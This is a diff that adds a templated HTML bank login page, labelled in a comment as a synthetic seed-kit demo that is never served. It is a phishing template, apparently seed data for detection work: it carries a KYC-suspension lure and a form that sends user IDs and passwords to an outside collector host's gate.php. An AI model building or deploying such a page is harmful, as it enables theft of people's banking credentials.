@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<!-- QCertChain SEED KIT — synthetic demo page, never served on the internet. -->
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>{brand} - Internet Banking Login</title>
+  <link rel="icon" href="/assets/favicon.ico">
+  <style>body {{ background: {bg}; }} .header {{ background-color: {accent}; }}</style>
+</head>
+<body>
+  <div class="header"><img src="/assets/{slug}.png" alt="{brand}"><span>{tagline}</span></div>
+  <div class="container">
+    <div class="notice"><p>Dear Customer, your KYC is pending. Verify now to avoid suspension.</p></div>
+    <form id="loginForm" method="post" action="https://{collector}/gate.php">
+      <h2>Login to {brand}</h2>
+      <input type="text" name="uid" placeholder="User ID">
+      <input type="password" name="pwd" placeholder="Password">
+      <input type="hidden" name="ref" value="{ref}">
+      <button type="submit">Login</button>
+    </form>
+  </div>
+  <div class="footer"><p>Copyright 2026 {brand}.</p></div>
+  <script>document.getElementById('loginForm').addEventListener('submit', function (e) {{ }});</script>
+</body>
+</html>
